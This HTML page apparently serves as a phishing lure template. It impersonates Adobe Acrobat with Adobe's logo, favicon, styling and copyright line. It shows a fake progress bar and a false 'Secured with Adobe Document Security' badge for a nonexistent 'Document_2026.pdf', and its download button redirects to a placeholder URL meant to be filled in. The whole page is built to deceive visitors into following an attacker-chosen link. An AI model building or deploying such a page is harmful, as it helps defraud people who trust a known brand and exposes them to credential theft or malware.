<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Acrobat - Secure PDF Download</title>
    <link rel="icon" href="https://www.adobe.com/favicon.ico">
    <style>
        @page { size: A4; margin: 0; }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Top navigation bar */
        .top-bar {
            background-color: #2c2c2c;
            padding: 12px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .top-bar-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .adobe-icon {
            width: 30px;
            height: 26px;
        }

        .top-bar-title {
            color: #ffffff;
            font-size: 16px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        .top-bar-subtitle {
            color: #b3b3b3;
            font-size: 13px;
            font-weight: 400;
            margin-left: 8px;
        }

        /* Main content area */
        .main-content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .download-card {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.08), 0 1px 4px rgba(0, 0, 0, 0.04);
            padding: 48px;
            max-width: 520px;
            width: 100%;
            text-align: center;
        }

        .pdf-icon-wrapper {
            width: 80px;
            height: 96px;
            margin: 0 auto 24px;
            position: relative;
        }

        .pdf-icon {
            width: 80px;
            height: 96px;
        }

        .file-name {
            font-size: 18px;
            font-weight: 700;
            color: #2c2c2c;
            margin-bottom: 8px;
        }

        .file-meta {
            font-size: 13px;
            color: #6e6e6e;
            margin-bottom: 32px;
        }

        .file-meta span {
            margin: 0 6px;
        }

        /* Progress section */
        .progress-section {
            margin-bottom: 28px;
        }

        .progress-bar-track {
            width: 100%;
            height: 4px;
            background: #e8e8e8;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .progress-bar-fill {
            height: 100%;
            background: linear-gradient(90deg, #EB1000, #ff4d38);
            border-radius: 2px;
            width: 0%;
            animation: progressFill 3s ease-in-out forwards;
        }

        @keyframes progressFill {
            0% { width: 0%; }
            20% { width: 15%; }
            40% { width: 35%; }
            60% { width: 58%; }
            80% { width: 82%; }
            100% { width: 100%; }
        }

        .progress-text {
            font-size: 13px;
            color: #6e6e6e;
        }

        .progress-percent {
            font-weight: 600;
            color: #2c2c2c;
        }

        /* Download button */
        .download-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: #EB1000;
            color: #ffffff;
            border: none;
            border-radius: 20px;
            padding: 14px 36px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease;
            opacity: 0;
            animation: fadeIn 0.5s ease forwards 3.2s;
        }

        .download-btn:hover {
            background: #c40d00;
        }

        .download-btn svg {
            width: 18px;
            height: 18px;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        /* Security badge */
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 20px;
            font-size: 12px;
            color: #959595;
        }

        .security-badge svg {
            width: 14px;
            height: 14px;
            fill: #959595;
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 11px;
            color: #959595;
        }

        .footer a {
            color: #959595;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
        /* Print / PDF styles */
        @media print {
            body { background: #ffffff; }
            .top-bar { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
            .download-card { box-shadow: none; border: 1px solid #e0e0e0; }
            .download-btn { -webkit-print-color-adjust: exact; print-color-adjust: exact; opacity: 1; animation: none; }
            .progress-bar-fill { animation: none; width: 100%; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
        }
    </style>
</head>
<body>
    <!-- Top bar -->
    <div class="top-bar">
        <div class="top-bar-left">
            <svg class="adobe-icon" viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
            </svg>
            <span class="top-bar-title">Adobe Acrobat</span>
            <span class="top-bar-subtitle">PDF Document</span>
        </div>
    </div>

    <!-- Main content -->
    <div class="main-content">
        <div class="download-card">
            <!-- PDF Icon -->
            <div class="pdf-icon-wrapper">
                <svg class="pdf-icon" viewBox="0 0 80 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M0 8C0 3.58 3.58 0 8 0H52L80 28V88C80 92.42 76.42 96 72 96H8C3.58 96 0 92.42 0 88V8Z" fill="#F7F7F7" stroke="#E0E0E0" stroke-width="1"/>
                    <path d="M52 0L80 28H60C55.58 28 52 24.42 52 20V0Z" fill="#E8E8E8"/>
                    <rect x="16" y="54" rx="3" width="48" height="6" fill="#E0E0E0"/>
                    <rect x="16" y="66" rx="3" width="36" height="6" fill="#E0E0E0"/>
                    <rect x="16" y="78" rx="3" width="42" height="6" fill="#E0E0E0"/>
                    <text x="40" y="44" text-anchor="middle" fill="#EB1000" font-size="16" font-weight="700" font-family="sans-serif">PDF</text>
                </svg>
            </div>

            <div class="file-name">Document_2026.pdf</div>
            <div class="file-meta">
                PDF Document <span>•</span> 2.4 MB <span>•</span> 12 pages
            </div>

            <!-- Progress -->
            <div class="progress-section">
                <div class="progress-bar-track">
                    <div class="progress-bar-fill"></div>
                </div>
                <div class="progress-text">
                    Preparing your document... <span class="progress-percent" id="percent">0%</span>
                </div>
            </div>

            <!-- Download button (appears after progress) -->
            <button class="download-btn" id="downloadBtn">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                    <polyline points="7 10 12 15 17 10"/>
                    <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
                Download PDF
            </button>

            <div class="security-badge">
                <svg viewBox="0 0 24 24"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
                Secured with Adobe Document Security
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        Copyright &copy; 2026 Adobe. All rights reserved. <span>|</span>
        <a href="#">Privacy</a> <span>|</span>
        <a href="#">Terms of Use</a>
    </div>

    <script>
        // Animate progress percentage
        var percentEl = document.getElementById('percent');
        var steps = [
            { time: 0, value: 0 },
            { time: 600, value: 15 },
            { time: 1200, value: 35 },
            { time: 1800, value: 58 },
            { time: 2400, value: 82 },
            { time: 3000, value: 100 }
        ];

        steps.forEach(function(step) {
            setTimeout(function() {
                percentEl.textContent = step.value + '%';
                if (step.value === 100) {
                    document.querySelector('.progress-text').innerHTML = 'Your document is ready';
                }
            }, step.time);
        });

        // Redirect on download button click
        document.getElementById('downloadBtn').addEventListener('click', function() {
            window.location.href = 'REDIRECT_URL_HERE';
        });
    </script>
</body>
</html>
